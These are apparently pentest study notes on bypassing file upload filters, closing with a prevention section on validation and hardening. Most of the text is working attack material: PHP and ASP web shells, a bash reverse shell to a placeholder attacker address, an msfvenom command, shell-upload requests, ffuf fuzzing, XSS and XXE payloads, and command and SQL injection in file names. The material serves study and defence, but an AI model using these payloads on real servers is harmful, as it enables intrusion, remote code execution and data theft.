### Content

- [Client-Side Validation](#client-side-validation)
	- [Using Proxy](#using-proxy)
	- [Disabling Front-end Validation](#disabling-front-end-validation)
- [Server-Side Validation](#server-side-validation)
	- [Blacklist Filters](#blacklist-filters)
	- [Whitelist Filters](#whitelist-filters)
		- [Double Extension](#double-extension)
		- [Reverse Double Extension](#reverse-double-extension)
		- [Character Injection](#character-injection)
- [Type Filters](#type-filters)
	- [Content-Type Header](#content-type-header)
	- [MIME-Type](#mime-type)
- [Different Techniques](#different-techniques)
	- [XSS From Image Metadata](#xss-from-image-metadata)
	- [XSS From SVG](#xss-from-svg)
	- [XXE From XML in SVG](#xxe-from-xml-in-svg)
	- [Injections in File Name](#injections-in-file-name)
	- [Windows-specific Attacks](#windows-specific-attacks)
	- [DOS](#dos)
- [Prevention](#prevention)

> [!NOTE]
> - [Web Extensions](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt) `Seclist` wordlist,  [PHP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP) `PayloadsAllTheThings` wordlists.
> - `SecList` [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt).
> - Web shells [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells).
> - PHP web shells: [phpbash](https://github.com/Arrexel/phpbash).
> - PHP Reverse web shell: [php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php).
> 
> Fast Web Shells:
> 
> - `<?php shell_exec('bash -c "bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1"'); ?>`
> - `<?php system($_REQUEST['cmd']); ?>`
> - `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`
> - `<% eval request('cmd') %>` -> .NET

---
### Client-Side Validation

- Modify the upload request to the back-end server.
- Manipulate the front-end code to disable these type validations.

If a form look like the following:

``` HTML
<form action="upload.php" method="POST" enctype="multipart/form-data" id="uploadForm" onSubmit="if(validate()){upload()}">
	<input type="file" name="uploadFile" id="uploadFile" onChange="showImage()" accept=".jpg,.jpeg,.png">
	<img src='/profile_images/pic.png' class='profile-image' id='profile-image'>
	<input type="submit" value="Upload" id="submit">
</form>
```

##### Using Proxy

Sending an image will yield this request: 

``` HTTP
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywRdo2lC1tHQrJPoV

------WebKitFormBoundarywRdo2lC1tHQrJPoV
Content-Disposition: form-data; name="uploadFile"; filename="ping.png"
Content-Type: image/png

[....SNIP....]
------WebKitFormBoundarywRdo2lC1tHQrJPoV--
```

Change the `filename` and its `content`, We may also modify the `Content-Type` of the uploaded file.

``` HTTP
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywRdo2lC1tHQrJPoV

------WebKitFormBoundarywRdo2lC1tHQrJPoV
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundarywRdo2lC1tHQrJPoV--
```

##### Disabling Front-end Validation

``` HTML
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

- `accept=".jpg,.jpeg,.png"` can be bypassed by selecting All Files on the file explorer.
- `onchange="checkFile(this)"` can be bypassed by deleting it from the web dev console.

``` HTML
<input type="file" name="uploadFile" id="uploadFile" onchange="">
```

---
### Server-Side Validation
#### Blacklist Filters

Vulnerable code test the file extension against a blacklist of extension, (Not comprehensive and case-sensitive).

``` PHP
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');
if (in_array($extension, $blacklist)) { echo "File type not allowed"; die(); }
```

Fuzz the request with FFUF, Prepare the HTTP request:

``` HTTP
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywRdo2lC1tHQrJPoV

------WebKitFormBoundarywRdo2lC1tHQrJPoV
Content-Disposition: form-data; name="uploadFile"; filename="shellFUZZ"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundarywRdo2lC1tHQrJPoV--
```

Using FFUF

``` bash
$ ffuf -w phpExtensions.txt -request request.txt -u http://167.71.131.167:32653/upload.php
.phpt                   [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 105ms] //success hit
.php                    [Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 108ms]
.pgif                   [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 2457ms] //success hit
.php8                   [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 2458ms] //success hit
.phar                   [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 2456ms] //success hit

$  curl -i -X POST -F 'uploadFile=@shell.php' http://167.71.131.167:32653/upload.php

File successfully uploaded 
```

> Not all extensions will work with all web server configurations, try several extensions to get one that successfully executes PHP code.
#### Whitelist Filters

A whitelist is generally more secure than a blacklist. The web server would only allow the specified extensions, and the list would not need to be comprehensive in covering uncommon extensions.

##### Double Extension

If the `regex` only checks whether the file name `contains` the extension and not if it actually `ends` with it. it can be bypassed using double extension   (`shell.jpg.php`).

``` PHP
$fileName = basename($_FILES["uploadFile"]["name"]);
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
	 echo "Only images are allowed"; die(); 
 }
# The pattern should be (!preg_match('^.*\.(jpg|jpeg|png|gif)$/', $fileName)) which uses (^.*\.) to match everything up to the last (.), and then uses ($) at the end to only match extensions that end the file name. 
```

##### Reverse Double Extension

`/etc/apache2/mods-enabled/php7.4.conf` server configuration for the `Apache2` determines which files to allow PHP code execution. (`shell.php.jpg`) can bypass, It ends with (`.jpg`) and it contains (`.php`) in its name.

To harden this regex, end it with `$` to specify that the extension should be in the end of the filename.

```XML
<FilesMatch ".+\.ph(ar|p|tml)">
	SetHandler application/x-httpd-php
</FilesMatch>
```

##### Character Injection

Inject characters before or after the final extension to cause the application to misinterpret the filename and execute the uploaded file as a PHP script. ex: `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`, `:`

Bash script that generates all permutations of the file name:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
        for ext in '.php' '.pht' '.phar' '.phpt' '.pgif' '.phtml' '.phtm' '.inc' '.php3' '.php4' '.php5' '.php7' '.php8'; do
                echo "shell$char$ext.jpg" >> wordlist.txt
                echo "shell$ext$char.jpg" >> wordlist.txt
                echo "shell.jpg$char$ext" >> wordlist.txt
                echo "shell.jpg$ext$char" >> wordlist.txt
        done
done
```

---
### Type Filters

- Web applications may test the content of the uploaded file to ensure it matches the specified type.
- Two common methods for validating the file content: `Content-Type Header` or `File Content`.

#### Content-Type Header

> [!Note]
> A file upload HTTP request has two Content-Type headers:
> - One for the attached file (at the bottom), Which we usually need to modify.
> - One for the full request (at the top), Which in some cases the request will only contain (e.g. uploaded content sent as `POST` data), then we will need to modify it.

```HTTP
POST /upload.php HTTP/1.1
[SNIP]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3ir0fGFKRBhxHcKA
[SNIP]

------WebKitFormBoundary3ir0fGFKRBhxHcKA
Content-Disposition: form-data; name="uploadFile"; filename="shell.png"
Content-Type: image/png

shell
------WebKitFormBoundary3ir0fGFKRBhxHcKA--

```

A vulnerable and limited PHP code can validate the file type by checking the `Content-Type` header which get set by the browser after reading the file extension:

```PHP
$type = $_FILES['uploadFile']['type'];
if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

We can fuzz this header using FUFF and the `Seclist` [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) wordlist:

```bash
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
$ cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
$ cat rquest
[SNIP]
Content-Disposition: form-data; name="uploadFile"; filename="shell.png"
Content-Type: FUZZ
[SNIP]
$ ffuf -w image-content-types.txt -request request.txt -u http://167.71.131.167:32653/upload.php
```

#### MIME-Type

- `Multipurpose Internet Mail Extensions (MIME)`, internet standard that determines the type of a file through its general format and bytes structure.
- By inspecting the first few bytes of the file's content, which contain the [File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://opensource.apple.com/source/file/file-23/file/magic/magic.mime). 
	- A GIF file starts with `GIF87a` or `GIF89a` or `GIF8` indicates that it is a `GIF` image.
	- A text file starts with plaintext.
	- If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.

``` bash
$ echo "this is a text file" > text.jpg && file text.jpg 
text.jpg: ASCII text

$ echo "GIF8" > text.jpg && file text.jpg
text.jpg: GIF image data
```

A PHP code that can test the MIME type of an uploaded file:

``` PHP
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
	echo "Only images are allowed";
	die();
}
```

A request that will bypass this check list can look like:

```HTTP
------WebKitFormBoundarywRdo2lC1tHQrJPoV
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/jpg

GIF8
<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundarywRdo2lC1tHQrJPoV--
```

Combine all of the attacks Allowed `MIME type` with a disallowed `Content-Type`, an Allowed `MIME/Content-Type` with a disallowed `extension`, or a Disallowed `MIME/Content-Type` with an allowed `extension`, and so on.

``` HTTP
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywRdo2lC1tHQrJPoV

------WebKitFormBoundarywRdo2lC1tHQrJPoV
Content-Disposition: form-data; name="uploadFile"; filename="FUZZ1"
Content-Type: FUZZ2

GIF8 or FUZZ3
<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundarywRdo2lC1tHQrJPoV--
```

---
### Different Techniques

There are types of files that when maliciously crafted and uploaded to the web server, can introduce a stored XSS vulnerability. (e.g. `SVG`, `HTML`, `XML` and even some images)

##### XSS From Image Metadata

If an image metadata is displayed after its upload, a XSS can be carried by uploading and image with malicious metadata:

``` bash
$ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' malicious.jpg
$ exiftool malicious.jpg
...SNIP...
Comment                         :  ><img src=1 onerror=alert(window.origin)>
```

> Changing an image `MIME-Type` to `text/html`, may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't displayed.

##### XSS From SVG

XSS carried by uploading `malicious.svg` (Scalable Vector Graphics) image which is XML-based :

``` XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
	<rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
	<script type="text/javascript">alert(window.origin);</script>
</svg>
```

##### XXE From XML in SVG

A malicious `XML` can be embedded within `SVG` images which may lead to local file disclosure. One the `malicious.SVG` is uploaded and viewed, the `XML` document would get processed.

Leaking the content of `/etc/passwd` by uploading `malicious.svg` with the payload:

``` XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg version="1.1" width="1" height="1" >&xxe;</svg>
```

Using PHP wrappers to encode the source code:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

> After uploading the payload, go to a page that should display the image, open the source code of the page.

##### Injections in File Name

- If the web app uses the file name within an OS command
	- `file$(whoami).jpg` or ``file`whoami`.jpg`` or `file.jpg||whoami`
- If the web app is displaying the filename, it may introduce XSS 
	- `<script>alert(window.origin);</script>.png`
- If the web app is using the filename in a SQL Query
	- `file';select+sleep(5);--.jpg`

##### Windows-specific Attacks

- Causing error by:
	- Using reserved wildcards characters such as (`|`, `<`, `>`, `*`, or `?`), in case of lack of user input sanitization and validation, it might disclose the upload directory.
	- Using reserved Windows files' names like (`CON`, `COM1`, `LPT1`, or `NUL`) as the web application will not be allowed to write a file with this name.
	- Utilizing Windows [8.3 Filename Convention](https://en.wikipedia.org/wiki/8.3_filename) to overwrite existing files or refer to files that do not exist. To refer to (`helpfulNotes.txt`) we can use (`help~1.TXT`) or (`help~2.TXT`), where the digit represents the order of the matching files that start with (`help`). (Windows still supports this convention)
		- Write a file called (e.g. `WEB~1.CONF`) to overwrite the first match of `web.conf` file.

##### DOS

###### Decompression Bomb

If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can lead to many Petabytes of data, resulting in a crash on the back-end server.

###### Pixel Flood

With images that utilize image compression, like `JPG` or `PNG`.
Create any `JPG` image file with any image size (e.g. `500x500`), then manually modify its compression data to say it has a size of (`0xffff x 0xffff`), resulting in an image with a perceived size of 4 Gigapixels.
When the web application attempts to display the image, it will attempt to allocate all of its memory to this image.

###### Sensitive Files Override

If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. `../../../etc/passwd`), which may also cause the server to crash.

---
### Prevention

##### Extension Validation

Use both whitelisting and blacklisting (Defense in Depth), this can be implemented in PHP:

```PHP
$fileName = basename($_FILES["uploadFile"]["name"]);

// The blacklist tests if the extension exists anywhere within the file name
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// The whitelist test if the file ends with allowed extensions
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

##### Content Validation

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// validate the file extension through whitelisting
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// validate both the File Signature and the HTTP Content-Type header
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

##### Further Controls

- Any direct requests to the upload directory should return a `403 Forbidden` response.
- Serve files through a script with security-focused HTTP headers such as:
	- `Content-Disposition`: Specify how the content should be displayed in the browser.
		- Set it to `attachment` to instruct the browser to download the file rather than render it inline.
	- `Content-Type`: Specifies the MIME type of the file, ensuring that the browser knows how to handle the file content appropriately.
	- `X-Content-Type-Options: nosniff`: Prevents the browser from MIME-type sniffing, which helps mitigate security risks by ensuring that the browser adheres strictly to the specified `Content-Type`.
- Randomize uploaded files' names in storage and store their "sanitized" original names in a database. So that when a script needs to download a file, it fetches its original name from the database and provides it at download time for the user.
- Disable functions that may be used to execute system commands through the web application.
- Disable showing any system or server errors. 
- Limit file size.
- Update any used libraries.
- Scan uploaded files for malware or malicious strings.
- Utilize a Web Application Firewall (WAF) as a secondary layer of protection.

---